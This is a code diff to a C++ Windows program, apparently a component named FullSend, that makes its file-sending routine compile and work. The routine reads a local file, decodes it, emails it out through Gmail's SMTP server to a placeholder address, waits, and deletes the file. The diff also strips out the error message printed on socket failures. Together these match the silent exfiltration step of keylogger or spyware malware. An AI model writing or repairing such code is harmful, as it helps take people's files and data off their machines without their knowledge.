@@ -1,8 +1,10 @@
 #include "FullSend.h"
 
+using namespace std;
+
 bool sendData(char * file_name) {
     if ( testConnection() ) {
-        sendEmail(decode(file_name);
+        sendEmail(decode(file_name));
         Sleep(SEND_TIME);
         DeleteFile(file_name);
     }
@@ -22,12 +24,10 @@ bool sendEmail(char * file_name) {
     #pragma comment(lib, "ws2_32.lib")
 
     // Insist on at least Winsock v1.1
-    const VERSION_MAJOR = 1;
-    const VERSION_MINOR = 1;
+    const int VERSION_MAJOR = 1;
+    const int VERSION_MINOR = 1;
 
     // Basic error checking for send() and recv() functions
-
-
     int         iProtocolPort        = 587;
     char        szSmtpServerName[64] = "smtp://smtp.gmail.com";
     char        szToAddr[64]         = "EMAIL";
@@ -37,9 +37,13 @@ bool sendEmail(char * file_name) {
     char        szMsgLine[255]       = "";
     SOCKET      hServer;
     WSADATA     WSData;
-    LPHOSTENT   lpHostEntry;
-    LPSERVENT   lpServEntry;
+    struct hostent *lpHostEntry;
+    struct servent *lpServEntry;
     SOCKADDR_IN SockAddr;
+	int iResult;
+	WSADATA wsaData;
+
+	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 
     // Create input stream for reading email message file
     ifstream MsgFile(file_name);
@@ -139,6 +143,4 @@ void Check(int iStatus, char *szFunction)
 {
     if((iStatus != SOCKET_ERROR) && (iStatus))
         return;
-
-    cerr << "Error during call to " << szFunction << ": " << iStatus << " - " << GetLastError() << endl;
 }
